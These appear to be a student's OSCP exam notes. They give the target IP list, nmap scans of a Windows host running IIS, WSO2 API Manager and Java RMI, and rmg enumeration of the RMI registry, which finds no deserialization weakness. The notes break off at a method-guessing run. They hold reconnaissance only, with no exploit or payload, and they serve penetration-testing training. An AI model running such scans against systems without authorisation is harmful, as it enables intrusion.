```json
target:
172.16.115.100  
192.168.115.101  
172.16.115.102  
192.168.115.114  
192.168.115.112  
192.168.115.110
```

## 101

### Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam]
└─$ sudo nmap -A -sC -T4 192.168.115.101
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-08 08:14 CST
Nmap scan report for 192.168.115.101
Host is up (0.25s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8099/tcp  open  ssl/unknown
| ssl-cert: Subject: commonName=localhost/organizationName=WSO2/stateOrProvinceName=CA/countryName=US
| Subject Alternative Name: DNS:localhost
| Not valid before: 2019-10-23T07:30:43
|_Not valid after:  2022-01-25T07:30:43
|_ssl-date: TLS randomness does not represent time
9099/tcp  open  unknown
9999/tcp  open  java-rmi      Java RMI
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @192.168.51.101:11111
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
11111/tcp open  java-rmi      Java RMI
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|2008 (87%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: Microsoft Windows XP SP3 (87%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -358d00h15m00s
| smb2-time:
|   date: 2022-09-15T00:01:55
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   254.36 ms 192.168.49.1
2   254.66 ms 192.168.115.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.17 seconds
```

```json
PORT      STATE SERVICE        REASON
80/tcp    open  http           syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
445/tcp   open  microsoft-ds   syn-ack
5040/tcp  open  unknown        syn-ack
5672/tcp  open  amqp           syn-ack
7680/tcp  open  pando-pub      syn-ack
8099/tcp  open  unknown        syn-ack
8243/tcp  open  synapse-nhttps syn-ack
8280/tcp  open  synapse-nhttp  syn-ack
8672/tcp  open  unknown        syn-ack
9099/tcp  open  unknown        syn-ack
9443/tcp  open  tungsten-https syn-ack
9611/tcp  open  unknown        syn-ack
9711/tcp  open  unknown        syn-ack
9763/tcp  open  unknown        syn-ack
9999/tcp  open  abyss          syn-ack
11111/tcp open  vce            syn-ack
19150/tcp open  gkrellm        syn-ack
49664/tcp open  unknown        syn-ack
49665/tcp open  unknown        syn-ack
49666/tcp open  unknown        syn-ack
49667/tcp open  unknown        syn-ack
49668/tcp open  unknown        syn-ack
49669/tcp open  unknown        syn-ack
49671/tcp open  unknown        syn-ack
49672/tcp open  unknown        syn-ack
65469/tcp open  unknown        syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 833.33 seconds

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam]
└─$ sudo nmap -A -sC -T4 192.168.115.101 -p 80,135,139,445,5040,5672,7680,8099,8243,8280,8672,9099,9443,9611,9711,9763,9999,1
1111,19150,49664,49665,49666,49667,49668,49669,49671,49672,65469
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-08 08:49 CST
Nmap scan report for 192.168.115.101
Host is up (0.22s latency).

PORT      STATE SERVICE             VERSION
80/tcp    open  http                Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5672/tcp  open  amqp                Advanced Message Queue Protocol
|_amqp-info: ERROR: AMQP:handshake connection closed unexpectedly while reading frame header
7680/tcp  open  pando-pub?
8099/tcp  open  ssl/unknown
8243/tcp  open  synapse-nhttps?
8280/tcp  open  synapse-nhttp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Content-Type: application/xml; charset=UTF-8
|     Date: Thu, 15 Sep 2022 00:34:50 GMT
|     Connection: Close
|     <am:fault xmlns:am="http://wso2.org/apimanager"><am:code>404</am:code><am:type>Status report</am:type><am:message>Not Found</am:message><am:description>The requested resource is not available.</am:description></am:fault>
|   GenericLines:
|     HTTP/1.1 400 Bad request
|     Connection: Close
|     Date: Thu, 15 Sep 2022 00:34:19 GMT
|     Content-Length: 0
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Date: Thu, 15 Sep 2022 00:34:19 GMT
|     Connection: Close
|     <html xmlns="http://ws.apache.org/ns/synapse"><body><H1>Welcome to APIM</H1><a href="/service" style="display: none">service</a></body></html>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Date: Thu, 15 Sep 2022 00:34:21 GMT
|     Connection: Close
|     <html xmlns="http://ws.apache.org/ns/synapse"><body><H1>Welcome to APIM</H1><a href="/service" style="display: none">service</a></body></html>
|   Help, SSLSessionReq:
|     HTTP/1.1 400 Bad request
|     Connection: Close
|     Date: Thu, 15 Sep 2022 00:34:37 GMT
|     Content-Length: 0
|   Kerberos, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad request
|     Connection: Close
|     Date: Thu, 15 Sep 2022 00:34:38 GMT
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad request
|     Connection: Close
|     Date: Thu, 15 Sep 2022 00:34:21 GMT
|_    Content-Length: 0
8672/tcp  open  unknown
9099/tcp  open  unknown
9443/tcp  open  ssl/tungsten-https?
| fingerprint-strings:
|   DNSStatusRequestTCP:
|     HTTP/1.1 400
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:41 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   DNSVersionBindReqTCP, RPCCheck:
|     HTTP/1.1 400
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:40 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   GetRequest:
|     HTTP/1.1 302
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Set-Cookie: JSESSIONID=DC494DFD94436BBD4E1CB79B38E9B625; Path=/; Secure; HttpOnly
|     Location: https://ms01.oscp.exam:9443/publisher/
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:30 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   HTTPOptions:
|     HTTP/1.1 302
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Set-Cookie: JSESSIONID=370015042EE90BB045AEEE0432E652F3; Path=/; Secure; HttpOnly
|     Location: https://ms01.oscp.exam:9443/publisher/
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:37 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   Help:
|     HTTP/1.1 400
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:43 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   RTSPRequest:
|     HTTP/1.1 505
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:39 GMT
|     Server: WSO2 Carbon Server
|   SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:44 GMT
|     Connection: close
|_    Server: WSO2 Carbon Server
9611/tcp  open  unknown
9711/tcp  open  ssl/unknown
9763/tcp  open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help:
|     HTTP/1.1 400
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:33 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   HTTPOptions:
|     HTTP/1.1 302
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Set-Cookie: JSESSIONID=2DE5D5332C82D5A0744B82230FF5BA81; Path=/; Secure; HttpOnly
|     Location: https://ms01.oscp.exam:9443/publisher/
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:32 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   Kerberos:
|     HTTP/1.1 400
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:37 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   RPCCheck:
|     HTTP/1.1 400
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:32 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   RTSPRequest:
|     HTTP/1.1 505
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:32 GMT
|     Server: WSO2 Carbon Server
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400
|     Content-Length: 0
|     Date: Thu, 15 Sep 2022 00:34:36 GMT
|     Connection: close
|_    Server: WSO2 Carbon Server
9999/tcp  open  java-rmi            Java RMI
11111/tcp open  java-rmi            Java RMI
19150/tcp open  ssl/gkrellm?
| ssl-cert: Subject: commonName=RemoteSystemMonitor
| Not valid before: 2022-05-28T17:36:08
|_Not valid after:  2222-05-28T17:36:08
| fingerprint-strings:
|   DNSStatusRequestTCP:
|     a703826b02f24616be5e9e165f2893c8
|     c0f42ec133064c1d82a5aaa9db833378
|   DNSVersionBindReqTCP:
|     a703826b02f24616be5e9e165f2893c8
|     1bb7531a378e45dba5ae1e876da5a041
|   FourOhFourRequest:
|     a703826b02f24616be5e9e165f2893c8
|     752bc40882024a9f8e105620bb3ed748
|   GenericLines, NULL:
|     a703826b02f24616be5e9e165f2893c8
|     10f88e98bca8462194d2328dc59a397e
|   GetRequest:
|     a703826b02f24616be5e9e165f2893c8
|     c90a5e8b14834a3799d6c0a8e11b79f2
|   HTTPOptions:
|     a703826b02f24616be5e9e165f2893c8
|     40b4d76f2de6469f855654b2e7353bd8
|   Help:
|     a703826b02f24616be5e9e165f2893c8
|     c65f35fbb93c4714947b0792e77a9cba
|   Kerberos:
|     a703826b02f24616be5e9e165f2893c8
|     b8f807abc155476e9c955d441c4b62c1
|   LDAPSearchReq:
|     a703826b02f24616be5e9e165f2893c8
|     d712503e3565422dad2a993f69fb1475
|   LPDString:
|     a703826b02f24616be5e9e165f2893c8
|     529e2b0697014588992a434b252964b4
|   RPCCheck:
|     a703826b02f24616be5e9e165f2893c8
|     b5fabb9d69d4489d988c4dd0d4db6adf
|   RTSPRequest:
|     a703826b02f24616be5e9e165f2893c8
|     473f566bdc174addae85fcd11b13df17
|   SMBProgNeg:
|     a703826b02f24616be5e9e165f2893c8
|     ac8ff435ce2a444c8dde28e5b148accf
|   SSLSessionReq:
|     a703826b02f24616be5e9e165f2893c8
|     21e39998dc1944cfa53f8dc999a75bc6
|   TLSSessionReq:
|     a703826b02f24616be5e9e165f2893c8
|     f617b3b27e9e470d816d38da06cf6c06
|   TerminalServerCookie:
|     a703826b02f24616be5e9e165f2893c8
|     7ee9524f44ac4b5aad84cec0320c47a6
|   X11Probe:
|     a703826b02f24616be5e9e165f2893c8
|_    ea6ae06c7f42432e90433e2ad49e3e86
49664/tcp open  msrpc               Microsoft Windows RPC
49665/tcp open  msrpc               Microsoft Windows RPC
49666/tcp open  msrpc               Microsoft Windows RPC
49667/tcp open  msrpc               Microsoft Windows RPC
49668/tcp open  msrpc               Microsoft Windows RPC
49669/tcp open  msrpc               Microsoft Windows RPC
49671/tcp open  msrpc               Microsoft Windows RPC
49672/tcp open  msrpc               Microsoft Windows RPC
65469/tcp open  tcpwrapped
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8280-TCP:V=7.92%I=7%D=9/8%Time=64FA6F90%P=aarch64-unknown-linux-gnu
SF:%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20request\r\nConnection:\x
SF:20Close\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:19\x20GMT\r\nCon
SF:tent-Length:\x200\r\n\r\n")%r(GetRequest,101,"HTTP/1\.0\x20200\x20OK\r\
SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nDate:\x20Thu,\x2015\x2
SF:0Sep\x202022\x2000:34:19\x20GMT\r\nConnection:\x20Close\r\n\r\n<html\x2
SF:0xmlns=\"http://ws\.apache\.org/ns/synapse\"><body><H1>Welcome\x20to\x2
SF:0APIM</H1><a\x20href=\"/service\"\x20style=\"display:\x20none\">service
SF:</a></body></html>")%r(HTTPOptions,101,"HTTP/1\.0\x20200\x20OK\r\nConte
SF:nt-Type:\x20text/html;\x20charset=UTF-8\r\nDate:\x20Thu,\x2015\x20Sep\x
SF:202022\x2000:34:21\x20GMT\r\nConnection:\x20Close\r\n\r\n<html\x20xmlns
SF:=\"http://ws\.apache\.org/ns/synapse\"><body><H1>Welcome\x20to\x20APIM<
SF:/H1><a\x20href=\"/service\"\x20style=\"display:\x20none\">service</a></
SF:body></html>")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20request\r\n
SF:Connection:\x20Close\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:21\
SF:x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(Help,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20request\r\nConnection:\x20Close\r\nDate:\x20Thu,\x2015\x20Sep\x
SF:202022\x2000:34:37\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(SSLSessio
SF:nReq,67,"HTTP/1\.1\x20400\x20Bad\x20request\r\nConnection:\x20Close\r\n
SF:Date:\x20Thu,\x2015\x20Sep\x202022\x2000:34:37\x20GMT\r\nContent-Length
SF::\x200\r\n\r\n")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:request\r\nConnection:\x20Close\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x
SF:2000:34:38\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(TLSSessionReq,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20request\r\nConnection:\x20Close\r\nDate:\x2
SF:0Thu,\x2015\x20Sep\x202022\x2000:34:38\x20GMT\r\nContent-Length:\x200\r
SF:\n\r\n")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20request\r\nConnectio
SF:n:\x20Close\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:38\x20GMT\r\
SF:nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,15C,"HTTP/1\.0\x204
SF:04\x20Not\x20Found\r\nContent-Type:\x20application/xml;\x20charset=UTF-
SF:8\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:50\x20GMT\r\nConnectio
SF:n:\x20Close\r\n\r\n<am:fault\x20xmlns:am=\"http://wso2\.org/apimanager\
SF:"><am:code>404</am:code><am:type>Status\x20report</am:type><am:message>
SF:Not\x20Found</am:message><am:description>The\x20requested\x20resource\x
SF:20is\x20not\x20available\.</am:description></am:fault>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9443-TCP:V=7.92%T=SSL%I=7%D=9/8%Time=64FA6F9B%P=aarch64-unknown-lin
SF:ux-gnu%r(GetRequest,13F,"HTTP/1\.1\x20302\x20\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nSet-Cookie:\x2
SF:0JSESSIONID=DC494DFD94436BBD4E1CB79B38E9B625;\x20Path=/;\x20Secure;\x20
SF:HttpOnly\r\nLocation:\x20https://ms01\.oscp\.exam:9443/publisher/\r\nCo
SF:ntent-Length:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:30\x2
SF:0GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n
SF:\r\n")%r(HTTPOptions,13F,"HTTP/1\.1\x20302\x20\r\nX-Content-Type-Option
SF:s:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nSet-Cookie:\x
SF:20JSESSIONID=370015042EE90BB045AEEE0432E652F3;\x20Path=/;\x20Secure;\x2
SF:0HttpOnly\r\nLocation:\x20https://ms01\.oscp\.exam:9443/publisher/\r\nC
SF:ontent-Length:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:37\x
SF:20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\
SF:n\r\n")%r(RTSPRequest,65,"HTTP/1\.1\x20505\x20\r\nContent-Length:\x200\
SF:r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:39\x20GMT\r\nServer:\x20
SF:WSO2\x20Carbon\x20Server\r\n\r\n")%r(RPCCheck,78,"HTTP/1\.1\x20400\x20\
SF:r\nContent-Length:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:
SF:40\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Serve
SF:r\r\n\r\n")%r(DNSVersionBindReqTCP,78,"HTTP/1\.1\x20400\x20\r\nContent-
SF:Length:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:40\x20GMT\r
SF:\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")
SF:%r(DNSStatusRequestTCP,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x200
SF:\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:41\x20GMT\r\nConnection
SF::\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(Help,78,"
SF:HTTP/1\.1\x20400\x20\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2015\x20
SF:Sep\x202022\x2000:34:43\x20GMT\r\nConnection:\x20close\r\nServer:\x20WS
SF:O2\x20Carbon\x20Server\r\n\r\n")%r(SSLSessionReq,78,"HTTP/1\.1\x20400\x
SF:20\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:
SF:34:44\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Se
SF:rver\r\n\r\n")%r(TerminalServerCookie,78,"HTTP/1\.1\x20400\x20\r\nConte
SF:nt-Length:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:44\x20GM
SF:T\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\
SF:n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9763-TCP:V=7.92%I=7%D=9/8%Time=64FA6F9C%P=aarch64-unknown-linux-gnu
SF:%r(HTTPOptions,13F,"HTTP/1\.1\x20302\x20\r\nX-Content-Type-Options:\x20
SF:nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nSet-Cookie:\x20JSES
SF:SIONID=2DE5D5332C82D5A0744B82230FF5BA81;\x20Path=/;\x20Secure;\x20HttpO
SF:nly\r\nLocation:\x20https://ms01\.oscp\.exam:9443/publisher/\r\nContent
SF:-Length:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:32\x20GMT\
SF:r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n"
SF:)%r(RTSPRequest,65,"HTTP/1\.1\x20505\x20\r\nContent-Length:\x200\r\nDat
SF:e:\x20Thu,\x2015\x20Sep\x202022\x2000:34:32\x20GMT\r\nServer:\x20WSO2\x
SF:20Carbon\x20Server\r\n\r\n")%r(RPCCheck,78,"HTTP/1\.1\x20400\x20\r\nCon
SF:tent-Length:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:32\x20
SF:GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\
SF:r\n")%r(DNSVersionBindReqTCP,78,"HTTP/1\.1\x20400\x20\r\nContent-Length
SF::\x200\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:33\x20GMT\r\nConn
SF:ection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(DNS
SF:StatusRequestTCP,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x200\r\nDa
SF:te:\x20Thu,\x2015\x20Sep\x202022\x2000:34:33\x20GMT\r\nConnection:\x20c
SF:lose\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(Help,78,"HTTP/1
SF:\.1\x20400\x20\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x2
SF:02022\x2000:34:33\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20
SF:Carbon\x20Server\r\n\r\n")%r(SSLSessionReq,78,"HTTP/1\.1\x20400\x20\r\n
SF:Content-Length:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:36\
SF:x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r
SF:\n\r\n")%r(TerminalServerCookie,78,"HTTP/1\.1\x20400\x20\r\nContent-Len
SF:gth:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2000:34:36\x20GMT\r\nC
SF:onnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(
SF:TLSSessionReq,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x200\r\nDate:
SF:\x20Thu,\x2015\x20Sep\x202022\x2000:34:36\x20GMT\r\nConnection:\x20clos
SF:e\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(Kerberos,78,"HTTP/
SF:1\.1\x20400\x20\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2015\x20Sep\x
SF:202022\x2000:34:37\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x2
SF:0Carbon\x20Server\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port19150-TCP:V=7.92%T=SSL%I=7%D=9/8%Time=64FA6FB0%P=aarch64-unknown-li
SF:nux-gnu%r(NULL,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\
SF:x20\0\0\x0010f88e98bca8462194d2328dc59a397e")%r(GenericLines,4C,"4\x01\
SF:0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\x0010f88e98bca846
SF:2194d2328dc59a397e")%r(GetRequest,4C,"4\x01\0\0\x20\0\0\0a703826b02f246
SF:16be5e9e165f2893c8\x20\0\0\0c90a5e8b14834a3799d6c0a8e11b79f2")%r(HTTPOp
SF:tions,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\x
SF:0040b4d76f2de6469f855654b2e7353bd8")%r(RTSPRequest,4C,"4\x01\0\0\x20\0\
SF:0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\x00473f566bdc174addae85fcd1
SF:1b13df17")%r(RPCCheck,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f
SF:2893c8\x20\0\0\0b5fabb9d69d4489d988c4dd0d4db6adf")%r(DNSVersionBindReqT
SF:CP,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\x001
SF:bb7531a378e45dba5ae1e876da5a041")%r(DNSStatusRequestTCP,4C,"4\x01\0\0\x
SF:20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\0c0f42ec133064c1d82a5a
SF:aa9db833378")%r(Help,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2
SF:893c8\x20\0\0\0c65f35fbb93c4714947b0792e77a9cba")%r(SSLSessionReq,4C,"4
SF:\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\x0021e39998d
SF:c1944cfa53f8dc999a75bc6")%r(TerminalServerCookie,4C,"4\x01\0\0\x20\0\0\
SF:0a703826b02f24616be5e9e165f2893c8\x20\0\0\x007ee9524f44ac4b5aad84cec032
SF:0c47a6")%r(TLSSessionReq,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e1
SF:65f2893c8\x20\0\0\0f617b3b27e9e470d816d38da06cf6c06")%r(Kerberos,4C,"4\
SF:x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\0b8f807abc155
SF:476e9c955d441c4b62c1")%r(SMBProgNeg,4C,"4\x01\0\0\x20\0\0\0a703826b02f2
SF:4616be5e9e165f2893c8\x20\0\0\0ac8ff435ce2a444c8dde28e5b148accf")%r(X11P
SF:robe,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\0e
SF:a6ae06c7f42432e90433e2ad49e3e86")%r(FourOhFourRequest,4C,"4\x01\0\0\x20
SF:\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\x00752bc40882024a9f8e105
SF:620bb3ed748")%r(LPDString,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e
SF:165f2893c8\x20\0\0\x00529e2b0697014588992a434b252964b4")%r(LDAPSearchRe
SF:q,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\0d712
SF:503e3565422dad2a993f69fb1475");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|XP (85%)
OS CPE: cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%), Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -358d00h15m00s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-09-15T00:37:52
|_  start_date: N/A

TRACEROUTE (using port 9099/tcp)
HOP RTT       ADDRESS
1   219.46 ms 192.168.49.1
2   220.81 ms 192.168.115.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 704.66 seconds
```

#### Rmg

```json
┌──(ouyang㉿kali)-[~/tools/java/rmg]
└─$ java -jar rmg.jar enum 192.168.115.101 9999
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: 192.168.51.101:11111  TLS: no  ObjID: [1a85286e:1833fdf232c:-7ffe, -7463447305692967847]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- The remote server does not expose any codebases.
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+] 	- Server complained that object cannot be casted to java.lang.String.
[+] 	  --> The type java.lang.String is unmarshalled via readString().
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+] 	- RMI registry uses readString() for unmarshalling java.lang.String.
[+] 	  This prevents useCodebaseOnly enumeration from remote.
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+] 	- Registry rejected unbind call cause it was not sent from localhost.
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+] 	- Caught Exception containing 'no security manager' during RMI call.
[+] 	  --> The server does not use a Security Manager.
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enumeration:
[+]
[+] 	- RMI registry uses readString() for unmarshalling java.lang.String.
[+] 	  This prevents JEP 290 bypass enumeration from remote.
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught NoSuchObjectException during activate call (activator not present).
[+] 	  Configuration Status: Current Default

┌──(ouyang㉿kali)-[~/tools/java/rmg]
└─$ java -jar rmg.jar enum 192.168.115.101 11111
[+] RMI Registry Enumeration
[+]
[+] 	- Specified endpoint is not an RMI registry
[+] 	  Skipping registry related checks.
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- The remote server does not expose any codebases.
[+]
[+] RMI Security Manager enumeration:
[+]
[+] 	- Caught Exception containing 'no security manager' during RMI call.
[+] 	  --> The server does not use a Security Manager.
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught NoSuchObjectException during activate call (activator not present).
[+] 	  Configuration Status: Current Default

┌──(ouyang㉿kali)-[~/tools/java/rmg]
└─$ java -jar rmg.jar guess 192.168.115.101 9999
[+] Reading method candidates from internal wordlist rmg.txt
